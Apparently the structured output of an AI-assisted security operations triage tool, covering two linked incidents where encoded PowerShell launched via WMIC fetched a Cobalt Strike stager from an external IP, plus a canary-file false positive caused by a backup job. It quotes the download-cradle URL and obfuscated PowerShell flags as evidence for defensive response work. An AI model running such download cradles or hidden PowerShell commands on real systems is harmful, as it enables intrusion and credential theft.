alert.title: Suspicious PowerShell execution on FIN-SRV-04
alert.detectionSource: CrowdStrike Falcon Sensor / Sysmon Event ID 1

investigation.threatVerdict: Confirmed Malicious PowerShell C2 Ingestion via WMIC
investigation.summary: Adversary leveraged compromised service account svc-payroll to remotely invoke encoded PowerShell via WMI on FIN-SRV-04, attempting to retrieve scr.ps1 from an external staging host.
suspiciousActivityExplanation: WMIC.exe invoked on FIN-SRV-04 under high-integrity service credentials without scheduled task justification.
Obfuscated Base64 PowerShell flags (-NoProfile -WindowStyle Hidden) utilized to bypass basic command logging.
Direct HTTP request initiated to untrusted external IP (198.51.100.24:8080) targeting secondary payload scr.ps1.
evidence: Command Line contains encoded download cradle: http://198.51.100.24:8080/scripts/scr.ps1
assumptions: External IP 198.51.100.24 is an active attacker-controlled C2 redirector.
Initial access gained via phishing or password spraying targeting accounting tier.

recommendedSteps.action: Isolate FIN-SRV-04 from the corporate network.
recommendedSteps.rationale: Halt potential lateral movement into financial ledger databases.

recommendedSteps.action: Revoke and rotate Kerberos TGT and NTLM hashes for CORP\svc-payroll.
recommendedSteps.rationale: Invalidate hijacked authentication tokens across Active Directory.

recommendedSteps.action: Blacklist external IP 198.51.100.24 on perimeter firewalls.
Perform memory acquisition on FIN-SRV-04 before reboot.
recommendedSteps.rationale: Capture volatile payload and injected DLL artifacts.

investigation.memoryInfluenceSummary: Baseline investigation created prior to memory retention.

feedback.notes: Incident validated. Forensic analysis verified memory injection attempt targeting LSASS process. Forensic triage recovered secondary script scr.ps1 containing Cobalt Strike stager.
feedback.rootCause: Compromised service account svc-payroll utilized WMIC process creation to execute obfuscated PowerShell staging script for credential dumping.
feedback.remediationTaken: 1. Isolated FIN-SRV-04 via EDR. 2. Reset svc-payroll password and revoked all active Kerberos TGT tickets. 3. Blocked external C2 IP 198.51.100.24 on perimeter firewalls. 4. Updated EDR blocklist for payload hash e3b0c442...

hindsightResponse.message: Successfully retained incident outcome in Hindsight Cloud memory bank

alert.title: Suspicious PowerShell execution on FIN-SRV-07
alert.detectionSource: CrowdStrike Falcon Sensor / Sysmon Event ID 1

investigation.summary: Alert on FIN-SRV-07 strongly mirrors historical incident on FIN-SRV-04. Attacker leverages encoded script execution and WMIC execution for lateral positioning.
suspiciousActivityExplanation: Process powershell.exe spawned with non-standard command arguments.
Obfuscated command line flags detected: powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand SUVYIChOZXctT2...
Parent process is wmic.exe, which is commonly abused for remote process execution.
Organizational memory confirmed identical staging pattern previously mitigated on FIN-SRV-04.

mitreTechniques.name: Command and Scripting Interpreter: PowerShell
mitreTechniques.description: Adversaries may abuse PowerShell commands and scripts for execution.

mitreTechniques.name: Windows Management Instrumentation (WMI)
mitreTechniques.description: Adversaries may abuse WMI to execute malicious commands and move laterally.

mitreTechniques.name: Obfuscated Files or Information
mitreTechniques.description: Adversaries may attempt to make an executable or script difficult to discover or analyze.

assumptions: Command payload may be downloading an in-memory C2 agent or beacon.
Possible compromise of service account credentials based on parent execution tree.
Attacker may possess persistence mechanisms on adjacent subnets.

recommendedSteps.action: Isolate FIN-SRV-07 from enterprise network via EDR endpoint containment.
recommendedSteps.rationale: Prevent command-and-control beaconing and internal subnet reconnaissance.

recommendedSteps.action: Revoke and rotate Kerberos/NTLM tokens for associated service accounts.
recommendedSteps.rationale: Memory from FIN-SRV-04 revealed svc-payroll credentials were leaked during the earlier attack.

recommendedSteps.action: Extract and decode Base64 command payload from memory dump.
recommendedSteps.rationale: Identify secondary C2 staging URLs and payload hashes for enterprise-wide IOC sweep.

recommendedSteps.action: Review Windows Event ID 4688 and PowerShell Script Block Logging (ID 4104).
recommendedSteps.rationale: Verify whether child processes were spawned prior to isolation.

investigation.memoryInfluenceSummary: Applied learnings from previous incident on Unknown Asset (Historical SOC Incident). Historical resolution confirmed credential harvesting attempt via obfuscated PowerShell; playbook recommendations prioritized host isolation and svc-payroll credential revocation.

alert.title: Canary Ransomware Decoy File Modified on FILE-SRV-02

investigation.threatVerdict: Automated Canary Triggered by Enterprise Backup Job
investigation.summary: High entropy modification detected on canary decoy directory caused by scheduled Veeam deduplication engine during maintenance window.
suspiciousActivityExplanation: File modification signature coincided with scheduled storage deduplication window at 14:20.
Executing process verified as legitimately signed Veeam binary.
evidence: Process binary: C:\Program Files\Veeam\Backup\veeam_backup.exe (Valid Microsoft Authenticode signature)
Trigger file was read, compressed and rewritten during backup
assumptions: Canary folder was not excluded from Veeam job scope.

recommendedSteps.action: Whitelist canary honeypot directories from backup agent scanning.
recommendedSteps.rationale: Prevent false alarms during scheduled storage maintenance.

feedback.notes: Confirmed false positive. Storage maintenance job compressed canary decoy file. No ransomware behavior present.
feedback.rootCause: Veeam deduplication and compression engine scanned honeypot folder.
feedback.remediationTaken: Updated backup policy exclusion rules to skip Sentinel Canary directories.

hindsightResponse.message: Retained false positive pattern in Hindsight memory
